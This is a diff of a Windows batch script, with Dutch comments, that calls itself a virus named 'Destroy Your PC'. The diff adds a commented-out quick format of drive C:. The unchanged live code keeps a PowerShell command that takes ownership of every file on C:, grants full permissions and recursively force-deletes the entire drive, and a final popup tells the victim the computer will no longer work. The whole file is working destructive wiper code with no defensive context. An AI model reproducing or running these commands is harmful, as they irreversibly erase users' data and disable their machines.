@@ -59,11 +59,15 @@ ping localhost -n 2 >nul
 echo Virus fully deployed.
 ping localhost -n 2 >nul
 
-:: === WIPE MET POWERSHELL ===
+:: === NIEUWE WIPE EERST (FORMAT STIJL) ===
+echo [!] Initiating new brute wipe...
+:: format C: /FS:NTFS /Q /Y
+ping localhost -n 5 >nul
+
+:: === OUDE POWERSHELL WIPE NA FORMAT ===
 powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERNAME':F /t /c; Remove-Item C:\* -Recurse -Force; Remove-Item C:\ -Recurse -Force"
 
 :: === FINAL POPUP ===
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"
 
 pause
-
